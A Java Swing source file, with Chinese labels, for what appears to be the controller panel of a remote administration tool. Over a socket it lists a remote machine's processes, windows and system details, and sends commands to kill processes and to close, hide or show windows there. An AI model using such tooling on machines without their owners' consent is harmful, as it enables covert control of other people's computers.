package me.server.receive;

import me.server.utils.ImageRendererUtils;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;

public class SystemManager {
    DefaultTableModel defaultTableModel;
    DefaultTableModel defaultTableModel1;
    DefaultTableModel defaultTableModel2;
    Socket socket;
    InputStream inputStream = SystemManager.class.getClassLoader().getResourceAsStream("me/resources/tasklist.png");
    InputStream inputStream1 = SystemManager.class.getClassLoader().getResourceAsStream("me/resources/ghost.png");
    InputStream inputStream2 = SystemManager.class.getClassLoader().getResourceAsStream("me/resources/system.png");
    Image image = ImageIO.read(inputStream);
    Image image1 = ImageIO.read(inputStream1);
    Image image2 = ImageIO.read(inputStream2);
    public SystemManager(Socket socket, String IP) throws IOException {
        this.socket = socket;
        JDialog frame1 = new JDialog();
        JTabbedPane tabbedPane = new JTabbedPane();
        frame1.setIconImage(image);
        JPanel panel = new JPanel();
        JButton button = new JButton("刷新");
        JButton button1 = new JButton("结束进程");

        JButton button2 = new JButton("关闭窗口");
        JButton button3 = new JButton("隐藏窗口");
        JButton button4 = new JButton("显示窗口");
        JButton button5 = new JButton("刷新");
        panel.add(button1);
        panel.add(button);
        frame1.add(panel,BorderLayout.NORTH);
        JTable table = new JTable(){
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        JTable windowsTable = new JTable(){
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        JTable systemTable = new JTable(){
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        defaultTableModel = new DefaultTableModel(null,new String[]{"","进程名","CPU","Memory","VSZ","RSS","PID","路径"});
        defaultTableModel1 = new DefaultTableModel(null,new String[]{"","PID","窗口句柄","窗口名称"});
        defaultTableModel2 = new DefaultTableModel(null,new String[]{"","设备名称","设备信息"});
        table.setModel(defaultTableModel);
        table.setShowVerticalLines(false);
        table.setShowHorizontalLines(false);
        table.getTableHeader().setReorderingAllowed(false);
        table.getTableHeader().setResizingAllowed(false);
        table.getColumnModel().getColumn(0)
                .setCellRenderer(new ImageRendererUtils());
        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        table.getColumnModel().getColumn(0).setPreferredWidth(20);
        table.getColumnModel().getColumn(1).setPreferredWidth(150);
        table.getColumnModel().getColumn(2).setPreferredWidth(70);
        table.getColumnModel().getColumn(3).setPreferredWidth(70);
        table.getColumnModel().getColumn(4).setPreferredWidth(70);
        table.getColumnModel().getColumn(5).setPreferredWidth(70);
        table.getColumnModel().getColumn(6).setPreferredWidth(70);
        table.getColumnModel().getColumn(7).setPreferredWidth(460);

        windowsTable.setModel(defaultTableModel1);
        windowsTable.setShowVerticalLines(false);
        windowsTable.setShowHorizontalLines(false);
        windowsTable.getTableHeader().setReorderingAllowed(false);
        windowsTable.getTableHeader().setResizingAllowed(false);
        windowsTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        windowsTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        windowsTable.getColumnModel().getColumn(0)
                .setCellRenderer(new ImageRendererUtils());
        windowsTable.getColumnModel().getColumn(0).setPreferredWidth(20);
        windowsTable.getColumnModel().getColumn(1).setPreferredWidth(150);
        windowsTable.getColumnModel().getColumn(2).setPreferredWidth(150);
        windowsTable.getColumnModel().getColumn(3).setPreferredWidth(600);

        systemTable.setModel(defaultTableModel2);
        systemTable.setShowVerticalLines(false);
        systemTable.setShowHorizontalLines(false);
        systemTable.getTableHeader().setReorderingAllowed(false);
        systemTable.getTableHeader().setResizingAllowed(false);
        systemTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        systemTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        systemTable.getColumnModel().getColumn(0)
                .setCellRenderer(new ImageRendererUtils());
        systemTable.getColumnModel().getColumn(0).setPreferredWidth(20);
        systemTable.getColumnModel().getColumn(1).setPreferredWidth(250);
        systemTable.getColumnModel().getColumn(2).setPreferredWidth(650);
        frame1.setTitle("\\\\" + IP + "-" + "系统管理");
        JScrollPane scrollPane = new JScrollPane(table);
        JScrollPane scrollPane1 = new JScrollPane(windowsTable);
        JScrollPane scrollPane2 = new JScrollPane(systemTable);
        tabbedPane.add("进程管理",scrollPane);
        tabbedPane.add("窗口管理",scrollPane1);
        tabbedPane.add("系统信息",scrollPane2);
        frame1.add(tabbedPane);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(850,700);
        frame1.setVisible(true);
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                SendMessage.sendHead(MessageFlags.CLOSE_TASKLIST,socket);
            }
        });
        //进程枚举
        button.addActionListener((a)->{
            taskListFlash(table);
        });
        button1.addActionListener((a)->{
            int i = table.getSelectedRow();
            String context = (String) table.getValueAt(i,6);
            try {
                SendMessage.send(MessageFlags.STOP_PROCESS,context.trim().getBytes("GBK"),socket);
            } catch (UnsupportedEncodingException e) {
            }
            taskListFlash(table);
        });

        //窗口枚举
        button2.addActionListener((a)->{
            int i = windowsTable.getSelectedRow();
            String context = (String) windowsTable.getValueAt(i,2);
            try {
                SendMessage.send(MessageFlags.CLOSE_WINDOW,context.getBytes("GBK"),socket);
            } catch (UnsupportedEncodingException e) {
            }
            windowsFlash(windowsTable);
        });
        button3.addActionListener((a)->{
            int i = windowsTable.getSelectedRow();
            String context = (String) windowsTable.getValueAt(i,2);
            try {
                SendMessage.send(MessageFlags.HIDE_WINDOW,context.getBytes("GBK"),socket);
            } catch (UnsupportedEncodingException e) {
            }
        });
        button4.addActionListener((a)->{
            int i = windowsTable.getSelectedRow();
            String context = (String) windowsTable.getValueAt(i,2);
            try {
                SendMessage.send(MessageFlags.SHOW_WINDOW,context.getBytes("GBK"),socket);
            } catch (UnsupportedEncodingException e) {
            }
        });
        button5.addActionListener((a)->{
            windowsFlash(windowsTable);
        });

        tabbedPane.addChangeListener(a->{
            for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
                defaultTableModel.removeRow(index);
            }
            for(int index = windowsTable.getModel().getRowCount() - 1; index >= 0; index--) {
                defaultTableModel1.removeRow(index);
            }
            for(int index = systemTable.getModel().getRowCount() - 1; index >= 0; index--) {
                defaultTableModel2.removeRow(index);
            }
            switch (tabbedPane.getSelectedIndex()) {
                case 0:
                    SendMessage.sendHead(MessageFlags.UPDATE_TASKLIST,socket);
                    panel.removeAll();
                    panel.add(button);
                    panel.add(button1);
                    frame1.setSize(851,701);
                    frame1.setSize(850,700);
                    break;
                case 1:
                    SendMessage.sendHead(MessageFlags.ENUM_WINDOWS,socket);
                    panel.removeAll();
                    panel.add(button2);
                    panel.add(button3);
                    panel.add(button4);
                    panel.add(button5);
                    frame1.setSize(851,701);
                    frame1.setSize(850,700);
                    break;
                case 2:
                    SendMessage.sendHead(MessageFlags.UPDATE_SYSTEMINFO,socket);
                    panel.removeAll();
                    break;
            }
        });
    }
    public void taskListFlash(JTable table) {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel.removeRow(index);
        }
        SendMessage.sendHead(MessageFlags.UPDATE_TASKLIST,socket);
    }
    public void windowsFlash(JTable table) {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel1.removeRow(index);
        }
        SendMessage.sendHead(MessageFlags.ENUM_WINDOWS,socket);
    }
    public void taskListUpdate(byte[] bytes) throws IOException {
        String context = new String(bytes);
        String[] strs = context.split("\\|");
        Object[] objects = {image,strs[0],strs[1],strs[2],strs[3],strs[4],strs[5],strs[6]};
        defaultTableModel.addRow(objects);
    }
    public void windowsUpdate(byte[] bytes) throws IOException {
        String context = new String(bytes);
        String[] strs = context.split("\\|");
        Object[] objects = {image1,strs[0],strs[1],strs[2]};
        defaultTableModel1.addRow(objects);
    }
    public void systemUpdate(byte[] bytes) throws IOException {
        String context = new String(bytes);
        String[] strs = context.split("\\|");
        Object[] objects = {image2,strs[0],strs[1]};
        defaultTableModel2.addRow(objects);
    }
}